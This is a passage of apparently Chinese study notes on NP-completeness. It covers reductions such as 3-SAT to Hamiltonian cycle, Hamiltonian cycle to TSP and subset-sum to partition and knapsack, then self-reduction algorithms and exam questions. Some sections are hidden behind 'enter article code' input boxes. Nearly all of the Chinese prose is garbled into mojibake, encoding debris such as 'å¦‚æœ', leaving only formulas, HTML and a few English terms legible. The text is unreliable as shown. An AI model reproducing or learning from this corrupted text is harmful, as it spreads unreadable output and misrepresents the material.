å¦‚æœé€‰æ‹© Â¬x<sub>2</sub>=1ï¼Œåˆ™ x<sub>2</sub> å¯¹åº”çš„è·¯å¾„ä¸ºä»å³åˆ°å·¦ï¼›\n  - å¦‚æœé€‰æ‹© x<sub>3</sub>=1ï¼Œåˆ™ x<sub>4</sub> å¯¹åº”çš„è·¯å¾„ä¸ºä»å·¦åˆ°å³ã€‚\n- è¿™æ ·æˆ‘ä»¬å°±å¾—åˆ°äº†æœ€ç»ˆçš„å›¾Gã€‚\n\n![](https://img.jwt1399.top/img/image-20211205234535016.png)\n\nâ‡’\n\n- å‡è®¾ 3âˆ’SAT å®ä¾‹ Ï• æœ‰æ»¡è¶³çš„çœŸå€¼æŒ‡æ´¾ x<sup>âˆ—</sup>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨ G ä¸­æ‰¾åˆ°ä¸€ä¸ªå“ˆå¯†å°”é¡¿åœˆ Î“ å¦‚ä¸‹ï¼š\n\n  - å¦‚æœ x<sub>i</sub><sup>âˆ—</sup> = true æˆ‘ä»¬ä»å·¦åˆ°å³ç©¿è¿‡ç¬¬ i è¡Œ\n\n  - å¦‚æœ x<sub>i</sub><sup>âˆ—</sup> = false æˆ‘ä»¬ä»å³åˆ°å·¦ç©¿è¿‡ç¬¬ i è¡Œ\n\n\n- å¯¹äºæ¯ä¸ªå­—å¥ C<sub>j</sub> ï¼Œè‡³å°‘å­˜åœ¨ä¸€è¡Œ i æŒ‰ç…§æˆ‘ä»¬ä¸Šè¿°çš„æ–¹å‘ï¼ŒæŠŠå­å¥èŠ‚ç‚¹æ‹¼æ¥è¿›åœˆå†…(æˆ‘ä»¬åªæŠŠå­å¥èŠ‚ç‚¹æ‹¼æ¥è¿›åœˆæœ‰ä¸”ä»…æœ‰ä¸€æ¬¡)\n\nâ‡ \n\n- å‡è®¾ G ä¸­æœ‰ä¸€ä¸ªå“ˆå¯†å°”é¡¿åœˆ Î“ \n- å¦‚æœ Î“ åŠ å…¥äº†å­å¥èŠ‚ç‚¹ C<sub>j</sub>  ï¼Œ\n  - å¹¶å‡è®¾ä¸ C<sub>j</sub>  å‰åé‚»æ¥çš„èŠ‚ç‚¹é€šè¿‡è¾¹ e âˆˆ E ç›¸è¿ã€‚\n  - æˆ‘ä»¬ä»åœˆä¸­åˆ é™¤èŠ‚ç‚¹ C<sub>j</sub> å’Œå…¶ç›´è¿è¾¹ï¼Œå¹¶ç”¨è¾¹ e ä»£æ›¿ï¼Œå¾—åˆ° G âˆ’ { C<sub>j</sub> } çš„å“ˆå¯†å°”é¡¿åœˆã€‚\n\n- å¾ªç¯æ‰§è¡Œä¸Šè¿°æ–¹æ³•ï¼Œæˆ‘ä»¬å¾—åˆ°åœ¨ G âˆ’ { C<sub>1</sub>  , C<sub>2</sub>  , â€¦ , C<sub>k</sub> } ä¸Šçš„å“ˆå¯†å°”é¡¿åœˆ Î“â€²\n- å¦‚æœ Î“â€² åœ¨ç¬¬ i è¡Œçš„éå†æ–¹å‘æ˜¯ä»å·¦åˆ°å³çš„ï¼Œé‚£ä¹ˆç½® x<sub>i</sub><sup>âˆ—</sup>  = true ï¼Œå¦åˆ™ç½®  x<sub>i</sub><sup>âˆ—</sup>= false \n- æŒ‰ç…§ä¸Šè¿°æ­£ç¡®æ–¹å‘éå†è¿›è¡ŒçœŸå€¼æŒ‡æ´¾ï¼Œæ¯ä¸ªå­å¥éƒ½ä¼šè¢«æ»¡è¶³ï¼Œå³åŸå®ä¾‹ Ï• å¯æ»¡è¶³ã€‚\n\n#### â‘¦å“ˆå¯†å°”é¡¿åœˆâ‰¤<sub>p</sub>æ—…è¡Œå”®è´§å‘˜\n\n> **Ham-cycle â‰¤<sub>p</sub> TSPï¼ˆå“ˆå¯†å°”é¡¿åœˆ â‰¤<sub>p</sub> æ—…è¡Œå”®è´§å‘˜é—®é¢˜ï¼‰**\n\n`TSPï¼š`ç»™å®š n ä¸ªåŸå¸‚ä»¥åŠä¸¤ä¸¤åŸå¸‚ä¹‹é—´çš„è·ç¦» d(u,v)ï¼Œé—®æ˜¯å¦å­˜åœ¨ä¸€ä¸ªæ—…æ¸¸è®¿é—® n ä¸ªåŸå¸‚ä¸€æ¬¡ä¸”é•¿åº¦ â‰¤ Dã€‚\n\n> **é—®é¢˜æè¿°ï¼š**ç»™å®šä¸€ä¸ªå“ˆå¯†å°”é¡¿åœˆçš„å®ä¾‹  G = (V,E)ï¼Œåˆ›å»ºä¸€ä¸ª TSP é—®é¢˜çš„å®Œå…¨å›¾å®ä¾‹ G'ï¼Œ n ä¸ªåŸå¸‚ä¸¤ä¸¤é—´çš„è·ç¦»å‡½æ•°å®šä¹‰å¦‚ä¸‹ï¼š![](https://img.jwt1399.top/img/image-20211201230052384.png)\n>\n> TSPé—®é¢˜æœ‰ä¸€ä¸ªé•¿åº¦ â‰¤ n çš„æ—…æ¸¸å½“ä¸”ä»…å½“ G ä¸­å«æœ‰ä¸€ä¸ªå“ˆå¯†å°”é¡¿åœˆ\n\nTSPå®ä¾‹æ»¡è¶³ä¸‰è§’å½¢ä¸ç­‰å¼ï¼šd(u,w) â‰¤ d(u,v)+d(v,w)\n\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n#### â‘§ä¸‰ç€è‰² â‰¤<sub>p</sub> kç€è‰²\n\n> **3-Color â‰¤<sub>p</sub> K-Color (K > 3)ï¼ˆä¸‰ç€è‰²é—®é¢˜ â‰¤<sub>p</sub> kç€è‰²é—®é¢˜ï¼‰**\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n#### â‘¨å“ˆå¯†å°”é¡¿åœˆâ‰¤<sub>p</sub>æœ€é•¿è·¯å¾„\n\n> **Ham-Cycle â‰¤<sub>p</sub> Longest-Pathï¼ˆå“ˆå¯†å°”é¡¿åœˆ â‰¤<sub>pÂ </sub>æœ€é•¿è·¯å¾„ï¼‰**\n\n`Longest-Pathï¼š`ç»™å®šä¸€ä¸ªæœ‰å‘å›¾ G = (V,E)ï¼Œæ˜¯å¦å­˜åœ¨è‡³å°‘ç”± k æ¡è¾¹ç»„æˆçš„ç®€å•è·¯å¾„ï¼Ÿ\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n#### â‘ªå­é›†å’Œâ‰¤<sub>p</sub>åˆ†åŒºé—®é¢˜\n\n> **Subset-Sum â‰¤<sub>p</sub> Partitionï¼ˆå­é›†å’Œé—®é¢˜ â‰¤<sub>pÂ </sub>åˆ†åŒºé—®é¢˜ï¼‰**\n\n`Subset-Sumï¼š`ç»™å®š n ä¸ªæ•° w<sub>1</sub> , â€¦ , w<sub>n</sub> å’Œæ•´æ•° Wï¼Œæ˜¯å¦å­˜åœ¨ä¸€ä¸ªå­é›†ï¼Œå…¶ä¸­æ‰€æœ‰å…ƒç´ çš„å’Œç­‰äº Wã€‚\n\n`Partitionï¼š`ç»™å®šå…ƒç´ ä¸ªæ•°ä¸º m çš„é›†åˆ V ={v<sub>1</sub> , v<sub>2</sub> , â€¦ , v<sub>m</sub>} ï¼Œæ˜¯å¦å¯ä»¥å°†é›†åˆ V åˆ†å‰²æˆä¸¤ä¸ªå­é›†ï¼Œä½¿æ¯ä¸ªå­é›†å„å…ƒç´ ä¹‹å’Œä¸º 1/2âˆ‘v<sub>i</sub>  ã€‚å³é›†åˆ A èƒ½åˆ’åˆ†æˆå…ƒç´ ä¹‹å’Œç›¸ç­‰çš„ä¸¤éƒ¨åˆ†ã€‚\n\n>(**å­é›†å’Œé—®é¢˜ â‰¤<sub>p </sub>åˆ†åŒºé—®é¢˜)é—®é¢˜æè¿°ï¼š**ç»™å®šä¸€ä¸ªé›†åˆ S = {w<sub>1</sub> , w<sub>2</sub> , â€¦ , w<sub>n</sub>}ï¼Œå­é›†å’Œä¸º Wï¼Œéœ€æ„é€ é›†åˆ S'ï¼Œä½¿å¾—é›†åˆ S å­˜åœ¨ä¸€ä¸ªå­é›†ä¹‹å’Œä¸º Wï¼Œå½“ä¸”ä»…å½“é›†åˆ S' å­˜åœ¨ä¸€ä¸ª Partition\n\n`è¯æ˜ï¼š`\n\næ„å›¾æ€è·¯ï¼šæ„é€ åˆ†åŒºé—®é¢˜é›†åˆ S' = \\{v<sub>1</sub> , v<sub>2</sub> , â€¦ , v<sub>n</sub>, v<sub>n+1</sub>, v<sub>n+2</sub>}ï¼Œå…¶ä¸­ï¼š\n\nv<sub>1</sub> = w<sub>1</sub>ï¼Œv<sub>2</sub> = w<sub>2</sub>, ... , v<sub>n</sub> = w<sub>n</sub>ï¼Œv<sub>n+1</sub> = 2âˆ‘w<sub>i</sub> - Wï¼Œv<sub>n+2</sub> = âˆ‘w<sub>i</sub> + W\n\nç”±äºåˆ†å‰²é—®é¢˜æ€»å’Œä¸º 4âˆ‘w<sub>i</sub>  ï¼Œæ‰€ä»¥ v<sub>n+1Â </sub> å’Œ v<sub>n+2</sub> ä¸èƒ½åœ¨åŒä¸€å­é›†ï¼Œä¸ç„¶è¯¥å­é›†å’Œä¸º3âˆ‘w<sub>i</sub>ï¼Œæœ€ç»ˆä¸èƒ½å‡åˆ†ã€‚è¦ä½¿æ¯éƒ¨åˆ†å’Œä¸º 2âˆ‘w<sub>i</sub> ï¼Œåªèƒ½æ˜¯å¦‚ä¸‹æƒ…å†µï¼š\n\n![](https://img.jwt1399.top/img/image-20211129154202796.png)\n\nâ‡’\nS å­˜åœ¨ä¸€ä¸ªå­é›† A = {a<sub>1</sub> , a<sub>2</sub> , â€¦ , a<sub>k</sub>}ï¼Œå…¶ä¸­ a<sub>k</sub> âˆˆ Sï¼Œkâ‰¤n ä¸” âˆ‘a<sub>i</sub> = W\n\né‚£ä¹ˆé›†åˆ S' ä¸­ï¼Œæœ‰ âˆ‘<sub>iâˆˆA</sub> a<sub>i</sub> + v<sub>n+1</sub> = âˆ‘<sub>iâˆˆS-A</sub> a<sub>i</sub> + v<sub>n+2</sub> = 2âˆ‘w<sub>i</sub>\n\næ‰€ä»¥é›†åˆ S' å­˜åœ¨ä¸€ä¸ªåˆ’åˆ† A âˆª {v<sub>n+1</sub>} å’Œ S-A âˆª {v<sub>n+2</sub>} \nâ‡\né›†åˆ S' èƒ½è¢«åˆ’åˆ†ä¸ºä¸¤ä¸ªå’Œç›¸ç­‰çš„é›†åˆï¼Œå¯çŸ¥ v<sub>n+1</sub> å’Œ v<sub>n+2</sub> ä¸åœ¨ä¸€ä¸ªåˆ’åˆ†å­é›†é‡Œ\n\né‚£ä¹ˆï¼Œå­˜åœ¨ä¸€ä¸ªé›†åˆ Aï¼Œè®¾å…¶å…ƒç´ ä¹‹å’Œä¸º Yï¼Œæœ‰ Y + v<sub>n+1</sub> = âˆ‘<sub>iâˆˆS</sub> w<sub>i</sub> - Y + v<sub>n+2</sub>\n\nè§£å‡º Y = Wã€‚\n\nâˆ´  Subset-Sum â‰¤<sub>p</sub> Partition\n\n#### â‘©å­é›†å’Œâ‰¤<sub>p</sub>èƒŒåŒ…é—®é¢˜\n\n> **Subset-Sum â‰¤<sub>p</sub> Knapsackï¼ˆå­é›†å’Œé—®é¢˜ â‰¤<sub>p</sub> èƒŒåŒ…é—®é¢˜ï¼‰**\n\n`Knapsackï¼š`ç»™å®šä¸€ä¸ªç‰©å“é›†åˆ X ï¼Œé‡é‡ä¸º u<sub>i</sub> â‰¥ 0 ï¼Œä»·å€¼ v<sub>i</sub> â‰¥ 0 ï¼ŒèƒŒåŒ…èƒ½æ‰¿å—çš„æ€»é‡é‡ä¸è¶…è¿‡ Uï¼Œç»™å®šä¸€ä¸ªç›®æ ‡ä»·å€¼ Vï¼Œæ˜¯å¦å­˜åœ¨ä¸€ä¸ªå­é›† S âŠ† X ä½¿å¾— âˆ‘<sub>iâˆˆS</sub> u<sub>i</sub>â‰¤*U*ï¼Œâˆ‘<sub>iâˆˆS</sub> v<sub>i</sub>â‰¥V\n\n>**(å­é›†å’Œé—®é¢˜ â‰¤<sub>p</sub> èƒŒåŒ…é—®é¢˜)é—®é¢˜æè¿°ï¼š**ç»™å®šä¸€ä¸ªé›†åˆ S = {w<sub>1</sub> , w<sub>2</sub> , â€¦ , w<sub>n</sub>}ï¼Œå­é›†å’Œä¸º Wï¼Œéœ€æ„é€ é›†åˆ S'ï¼Œä½¿å¾—é›†åˆ S å­˜åœ¨ä¸€ä¸ªå­é›†ä¹‹å’Œä¸º Wï¼Œå½“ä¸”ä»…å½“é›†åˆ S' å­˜åœ¨ä¸€ä¸ªèƒŒåŒ…å®ä¾‹\n\n`è¯æ˜ï¼š`\n\næ„å›¾æ€è·¯ï¼šå¯¹äºä»»æ„ä¸€ä¸ªå­é›†å’Œå®ä¾‹ï¼Œæˆ‘ä»¬æ„é€ ä¸€ä¸ªèƒŒåŒ…å®ä¾‹ï¼šu<sub>i</sub> = v<sub>i</sub> = w<sub>i</sub>ï¼ŒU = V = W\n\n â‡’\nS å­˜åœ¨ä¸€ä¸ªå­é›† A = {a<sub>1</sub> , a<sub>2</sub> , â€¦ , a<sub>k</sub>}ï¼Œå…¶ä¸­ a<sub>i</sub> âˆˆ Sï¼Œkâ‰¤n ä¸” âˆ‘a<sub>i</sub> = W\n\né‚£ä¹ˆé›†åˆ S' ä¸­ï¼Œæœ‰ âˆ‘a<sub>i</sub>  = âˆ‘u<sub>i</sub> = âˆ‘v<sub>i</sub> = Wï¼Œâˆ´  âˆ‘u<sub>i</sub> = Uï¼Œâˆ‘v<sub>i</sub> = V\n\næ‰€ä»¥é›†åˆ S' å­˜åœ¨ä¸€ä¸ªèƒŒåŒ…å®ä¾‹\nâ‡\né›†åˆ S' ä¸­å­˜åœ¨ä¸€ä¸ªèƒŒåŒ…å®ä¾‹ï¼Œå¯çŸ¥ âˆ‘<sub>iâˆˆS</sub> u<sub>i</sub>â‰¤*U*ï¼Œâˆ‘<sub>iâˆˆS</sub> v<sub>i</sub>â‰¥V\n\né‚£ä¹ˆï¼Œå­˜åœ¨ä¸€ä¸ªé›†åˆ Aï¼Œè®¾å…¶å…ƒç´ ä¹‹å’Œä¸º Yï¼Œæœ‰ Y  = W\n\nâˆ´  Subset-Sum â‰¤<sub>p</sub> Knapsack\n\n#### â‘«åˆ†åŒºé—®é¢˜ â‰¤<sub>p </sub>kè´Ÿè½½å‡è¡¡\n\n> **Partition â‰¤<sub>p</sub> k-Load-Balanceï¼ˆåˆ†åŒºé—®é¢˜â‰¤<sub>p </sub>kè´Ÿè½½å‡è¡¡ï¼‰**\n\n\n\n<table>\n    <tbody>\n        <tr>\n            <td><input type=\"text\" placeholder=\"ğŸ””è¯·è¾“å…¥æ–‡ç« æŸ¥çœ‹ç ï¼Œçœ‹æ›´å¤šå†…å®¹\"></td>\n            <td><button class=\"btn\">Button</button></td>\n        </tr>\n</tbody></table>\n\n\n\n### âºè‡ªå½’èº«çº¦\n\n> æŒæ¡åŒä¸€ä¸ªé—®é¢˜çš„æœ€ä¼˜åŒ–é—®é¢˜å¦‚ä½•å¤šé¡¹æ—¶é—´å½’çº¦åˆ°è¯¥é—®é¢˜çš„åˆ¤æ–­é—®é¢˜ï¼ˆè‡ªèº«å½’çº¦ï¼‰ï¼Œä¾‹å¦‚é¡¶ç‚¹è¦†ç›–é—®é¢˜ï¼ŒHamilton Cycleé—®é¢˜ï¼Œ3-Coloré—®é¢˜\n\n#### â€åŸºç¡€æ¦‚å¿µ\n\n**è‡ªèº«è§„çº¦ï¼š**å°†æ±‚è§£(æœ€ä¼˜åŒ–)é—®é¢˜å¤šé¡¹æ—¶é—´å½’çº¦åˆ°è¯¥é—®é¢˜çš„åˆ¤æ–­é—®é¢˜ã€‚\n\nå¦‚æœåˆ¤æ–­é—®é¢˜èƒ½å¤Ÿè§£å†³ï¼Œé‚£ä¹ˆå°±å¯ä»¥åˆ©ç”¨åˆ¤æ–­é—®é¢˜æ¥è§£å†³æ±‚è§£é—®é¢˜ã€‚\n\n**è‡ªå½’çº¦æ­¥éª¤**\n\n1. è®¾è¯¥åˆ¤æ–­ç®—æ³•ä¸º A ï¼Œåˆ©ç”¨ç®—æ³• A åˆ¤æ–­å‡ºå›¾ä¸­å­˜åœ¨...(å¤§å°ä¸ºkçš„...)ï¼›\n2. åˆ é™¤ä¸€æ¡è¾¹æˆ–ç‚¹(çœ‹å…·ä½“æ˜¯è¾¹é›†è¿˜æ˜¯ç‚¹é›†çš„é—®é¢˜)ï¼Œå¯¹åˆ é™¤è¾¹/ç‚¹åçš„å›¾è¿è¡Œåˆ¤æ–­ç®—æ³• A ï¼›\n3. è‹¥å›¾ä¸­è¿˜å­˜åœ¨...(å¤§å°ä¸ºkçš„...)ï¼Œåˆ™ä»å›¾ä¸­å½»åº•åˆ é™¤è¯¥è¾¹/ç‚¹ï¼›è‹¥ä¸å­˜åœ¨ï¼Œåˆ™æŠŠè¯¥è¾¹/ç‚¹åŠ å…¥é›†åˆ S ä¸­ï¼›\n4. å¯¹æ‰€æœ‰çš„è¾¹/ç‚¹è°ƒç”¨ç®—æ³• A æ‰§è¡Œä¸Šè¿°æ“ä½œï¼Œæœ€ç»ˆå¾—åˆ°çš„é›†åˆ S å°±æ˜¯æ±‚è§£é—®é¢˜çš„è§£ã€‚\n\nçœ‹å®Œä»¥ä¸Šè§£é¢˜æ­¥éª¤ï¼Œå°ç®€è§‰å¾—ä½ åº”è¯¥è¿˜æ˜¯æœ‰ç‚¹ç‚¹æ‡µæ‡µçš„ï¼Œä½†åˆ«æ‹…å¿ƒï¼Œçœ‹å®Œä¸‹é¢çš„å…·ä½“æ¡ˆä¾‹ä½ å†å›æ¥ç ”è¯»è§£é¢˜æ­¥éª¤ï¼Œæˆ‘ç›¸ä¿¡ä½ å¯¹è‡ªèº«è§„çº¦ä¼šæœ‰ä¸ä¸€æ ·çš„è®¤çŸ¥ï¼ŒåŠ æ²¹ï¼\n\n#### âVertex-Coveré—®é¢˜\n\nå‡å¦‚æˆ‘ä»¬èƒ½åˆ¤æ–­ä¸€ä¸ªå›¾ä¸­æ˜¯å¦å­˜åœ¨ç‚¹æ•°ä¸º k çš„æœ€å°ç‚¹è¦†ç›–ã€‚è¯·ä½ è®¾è®¡æ„é€ æœ€å°ç‚¹è¦†ç›–é—®é¢˜çš„å¤šé¡¹å¼æ—¶é—´ç®—æ³•ã€‚\n\n- è®¾è¯¥åˆ¤æ–­ç®—æ³•ä¸º A ï¼Œåˆ©ç”¨ç®—æ³• A åˆ¤æ–­å›¾ G æ˜¯å¦å­˜åœ¨ç‚¹æ•°ä¸º k çš„æœ€å°ç‚¹è¦†ç›–\n  - è‹¥ä¸å­˜åœ¨ï¼Œåˆ™ç»“æŸï¼›\n  - è‹¥å­˜åœ¨ï¼Œåˆ™åœ¨å›¾ä¸­åˆ é™¤ä¸€ä¸ªç‚¹ vï¼›\n- å†ç”¨ç®—æ³• A åˆ¤æ–­å›¾ G = (V-v, E) ä¸­æ˜¯å¦å­˜åœ¨ç‚¹æ•°ä¸º k çš„æœ€å°ç‚¹è¦†ç›–\n  - è‹¥å­˜åœ¨ï¼Œåˆ™å°†ç‚¹ v ä»å›¾ä¸­å½»åº•åˆ é™¤ï¼›\n  - è‹¥ä¸å­˜åœ¨ï¼Œåˆ™æŠŠç‚¹ v åŠ å…¥åˆ°é›†åˆ S ä¸­ï¼›\n- ä¸æ–­é‡å¤ä¸Šè¿°æ“ä½œï¼Œæœ€ç»ˆ S ä¸­çš„æ‰€æœ‰ç‚¹å°±æ˜¯æœ€å°ç‚¹è¦†ç›–ã€‚\n\n#### â‚Hamilton Cycleé—®é¢˜\n\n(2020)å¦‚æœå­˜åœ¨åˆ¤æ–­ä»»æ„ç®€å•æ— å‘å›¾æ˜¯å¦å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆçš„å¤šé¡¹å¼æ—¶é—´ç®—æ³•ï¼Œè¯·ä½ è®¾è®¡æ„é€ ä»»æ„ç®€å•æ— å‘å›¾çš„å“ˆå¯†å°”é¡¿åœˆï¼ˆå¦‚æœå­˜åœ¨çš„è¯ï¼‰çš„å¤šé¡¹å¼æ—¶é—´ç®—æ³•ã€‚\n\nç®—æ³•ï¼š\n\n//è®¾è¯¥åˆ¤æ–­ç®—æ³•ä¸ºA\nS åˆå§‹åŒ–ä¸ºç©ºé›†ï¼›\né¦–å…ˆç®—æ³• A åˆ¤æ–­å›¾ G ä¸­æ˜¯å¦å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç®—æ³•ç»“æŸï¼Œå¦‚æœå­˜åœ¨åˆ™ç»§ç»­å¯»æ‰¾å“ˆå¯†å°”é¡¿åœˆï¼›\nFor every edge e in G {\n\tå¦‚æœ G â€“ {e} ä¸­ä¸å­˜åœ¨å“ˆå¯†å°”é¡¿åœˆï¼Œåˆ™å°† e æ·»åŠ åˆ°é›†åˆ S ä¸­ï¼›\n\tå¦åˆ™ G = G â€“ {e}ï¼›\n} \næœ€ç»ˆæ‰€å¾—é›†åˆ S ä¸­çš„æ‰€æœ‰è¾¹æ„æˆå›¾ G çš„å“ˆå¯†å°”é¡¿åœˆã€‚\n\n#### âƒ3-Coloré—®é¢˜\n\n> 3-Coloré—®é¢˜ï¼šå¯¹ä¸€ä¸ªå›¾çš„é¡¶ç‚¹è¿›è¡Œä¸‰ç§é¢œè‰²ç€è‰²ä½¿å¾—ç›¸é‚»ä¸¤ä¸ªç‚¹çš„é¢œè‰²ä¸ä¸€æ ·\n\n(2018/2019)å¯¹äºä¸‰ç€è‰²é—®é¢˜ï¼Œè‹¥å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•åˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦å¯ä»¥ä¸‰ç€è‰²ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•å¯¹å¯ä»¥è¿›è¡Œä¸‰ç€è‰²çš„å›¾æ‰¾åˆ°ä¸€ä¸ªå¯è¡Œçš„ä¸‰ç€è‰²ã€‚\n\nè§£æ³•ä¸€ï¼šä¸æ–­åŠ è¾¹è¿›å»ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œç›´åˆ°ä¸èƒ½åŠ è¾¹ä¸ºæ­¢ã€‚è¿™æ ·ä¸‰ç§é¢œè‰²çš„ç‚¹å°±æ˜¯å›¾ä¸­ä¸‰ä¸ªç‹¬ç«‹é›†ã€‚  \n\nè§£æ³•äºŒï¼šä¸æ–­å°†ä¸¤ä¸ªä¸ç›¸é‚»çš„ç‚¹åˆå¹¶æˆä¸€ä¸ªç‚¹ç„¶åè¿›è¡Œåˆ¤æ–­ï¼Œç›´åˆ°ä¸èƒ½å†åˆå¹¶ä¸ºæ­¢ã€‚æœ€åå‰©ä¸‹ä¸‰ä¸ªç‚¹ã€‚\n\n#### â„Longest-Path\n\nå¦‚æœå­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•åˆ¤æ–­ä¸€ä¸ªå›¾æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸º k çš„è·¯å¾„ï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•è¦ä¹ˆæ‰¾åˆ°å›¾ä¸­ä¸€ä¸ªé•¿åº¦ä¸º k çš„è·¯å¾„è¦ä¹ˆè¯æ˜æ­¤å›¾ä¸å­˜åœ¨é•¿åº¦ä¸º k çš„è·¯å¾„ã€‚\n\n- å‡è®¾å­˜åœ¨åˆ¤æ–­ä¸€ä¸ªå›¾ G æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸º k çš„è·¯å¾„çš„å¤šé¡¹å¼æ—¶é—´ç®—æ³• A \n\n- é¦–å…ˆç”¨ç®—æ³• A åˆ¤æ–­å›¾ G æ˜¯å¦å­˜åœ¨ä¸€ä¸ªé•¿åº¦ä¸º k çš„è·¯å¾„\n  - è‹¥ä¸å­˜åœ¨ï¼Œåˆ™ç»“æŸï¼›\n  - è‹¥å­˜åœ¨ï¼Œåˆ™åœ¨å›¾ä¸­åˆ é™¤ä¸€æ¡è¾¹ e ï¼›\n- å†ç”¨ A åˆ¤æ–­å›¾ G = (V, E-e) ä¸­æ˜¯å¦å­˜åœ¨é•¿åº¦ä¸º k çš„ä¸€æ¡è·¯å¾„\n  - è‹¥å­˜åœ¨ï¼Œåˆ™å°†è¾¹ e ä»å›¾ä¸­å½»åº•åˆ é™¤ï¼›\n  - è‹¥ä¸å­˜åœ¨ï¼Œåˆ™æŠŠè¾¹ e åŠ å…¥åˆ°é›†åˆ S ä¸­ï¼›\n-  é‡å¤ä¸Šè¿°æ“ä½œï¼Œæœ€ç»ˆ S ä¸­çš„æ‰€æœ‰è¾¹æ„æˆçš„è¾¹å°±æ˜¯é•¿åº¦ä¸º k çš„ä¸€æ¡è·¯å¾„ã€‚\n\n#### â…Subset-Sumé—®é¢˜\n\nå¦‚æœå­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•åˆ¤æ–­ä¸€ä¸ªé›†åˆ V å­˜åœ¨ä¸€ä¸ªå­é›†ä¸”å…¶ä¸­å…ƒç´ çš„å’Œç­‰äº Wï¼Œåˆ™å­˜åœ¨ä¸€ä¸ªå¤šé¡¹å¼æ—¶é—´ç®—æ³•è¦ä¹ˆæ‰¾åˆ°å›¾ä¸­ä¸€ä¸ªå’Œä¸º W çš„å­é›†è¦ä¹ˆè¯æ˜æ­¤é›†åˆä¸å­˜åœ¨å’Œä¸ºWçš„å­é›†ã€‚\n\n- å‡è®¾å­˜åœ¨åˆ¤æ–­ä¸€ä¸ªé›†åˆ V æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå’Œä¸º W çš„å­é›†çš„å¤šé¡¹å¼æ—¶é—´ç®—æ³• A \n\n- é¦–å…ˆç”¨ç®—æ³• A åˆ¤æ–­è¯¥é›†åˆ V æ˜¯å¦å­˜åœ¨å’Œä¸º W çš„å­é›†\n  - è‹¥ä¸å­˜åœ¨ï¼Œåˆ™ç»“æŸï¼›\n  - è‹¥å­˜åœ¨ï¼Œåˆ™åœ¨é›†åˆä¸­åˆ é™¤ä¸€ä¸ªå…ƒç´  v ï¼›\n- å†ç”¨ A åˆ¤æ–­ V - v ä¸­æ˜¯å¦å­˜åœ¨å’Œä¸º W çš„å­é›†\n  - è‹¥å­˜åœ¨ï¼Œåˆ™å°†å…ƒç´  v ä»é›†åˆä¸­å½»åº•åˆ é™¤ï¼›\n  - è‹¥ä¸å­˜åœ¨ï¼Œåˆ™æŠŠå…ƒç´  v åŠ å…¥åˆ°é›†åˆ S ä¸­ï¼›\n- é‡å¤ä¸Šè¿°æ“ä½œï¼Œæœ€ç»ˆ S æ„æˆçš„é›†åˆå°±æ˜¯å’Œä¸º W çš„å­é›†ã€‚\n\n### â»çœŸé¢˜ç»ƒä¹ \n\n#### â€é¢˜ç›®1\n\nè¯æ˜é—®é¢˜å±äºNPCçš„åŸºæœ¬æ­¥éª¤\n\n- Step 1. è¯æ˜è¯¥é—®é¢˜æ˜¯NPé—®é¢˜.\n\n- Step 2. æ‰¾åˆ°ä¸€ä¸ªå·²çŸ¥çš„NPå®Œå…¨é—®é¢˜X.\n\n- Step 3. è¯æ˜é—®é¢˜Xå¯ä»¥å¤šé¡¹å¼å½’çº¦åˆ°è¯¥é—®é¢˜.\n\n#### âé¢˜ç›®2\n\n(2018)ç»™å‡ºä¸€ä¸ªå›¾å’Œä¸€ä¸ªæ•´æ•°kï¼Œé—®æ˜¯å¦å¯ä»¥åœ¨è¿™ä¸ªå›¾ä¸Šåˆ é™¤kä¸ªç‚¹ä½¿å¾—å‰©ä½™å›¾ä¸Šæ²¡æœ‰ä¸‰è§’å½¢ï¼ˆå«æœ‰3ä¸ªé¡¶ç‚¹çš„åœˆï¼‰ã€‚è¯æ˜è¿™ä¸ªé—®é¢˜æ˜¯NPå®Œå…¨çš„ã€‚  ï¼ˆ10åˆ†ï¼‰\n\nç­”ï¼šä»ç‚¹è¦†ç›–é—®é¢˜è§„çº¦è¿‡æ¥ï¼ˆ2åˆ†ï¼‰ã€‚\n\nå¯¹äºä¸€ä¸ªç‚¹è¦†ç›–å®ä¾‹ Gï¼Œæ„é€ ä¸€ä¸ªè¯¥é—®é¢˜å®ä¾‹ G'ï¼›ï¼ˆ1åˆ†ï¼‰\nå¯¹ G ä¸­æ¯ä¸€æ¡è¾¹ abï¼Œéƒ½æ·»åŠ ä¸€ä¸ªæ–°çš„é¡¶ç‚¹ c ç„¶åè¿æˆä¸‰è§’å½¢ abcã€‚ï¼ˆ4åˆ†ï¼‰\nè¯´æ˜ G å­˜åœ¨å¤§å°ä¸º k çš„ç‚¹è¦†ç›–å½“ä¸”ä»…å½“ G' å­˜åœ¨ä¸€ä¸ªå¤§å°ä¸º k çš„è§£ã€‚ï¼ˆ3åˆ†ï¼‰\n\n#### 